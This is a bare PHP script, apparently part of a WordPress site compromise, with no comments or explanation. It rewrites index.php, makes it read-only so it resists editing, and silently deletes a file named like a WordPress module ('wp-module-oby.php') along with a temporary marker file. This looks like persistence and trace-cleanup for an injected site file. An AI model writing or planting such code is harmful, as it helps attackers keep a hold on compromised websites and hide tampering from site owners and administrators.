<?php

	$out = fopen("wp-admin-temp", "w");
	fwrite($out, "...");
	fclose($out);

 $file = fopen("index.php", "r"); 
 $buffer = fread($file, filesize("index.php")); 

sleep(10);

						  $outheader = fopen("index.php", "w");
						  fwrite($outheader, $buffer);
						  fclose($outheader);
						  chmod($ddir."index.php", 0444);

@unlink("wp-module-oby.php");
@unlink("wp-admin-temp");
?>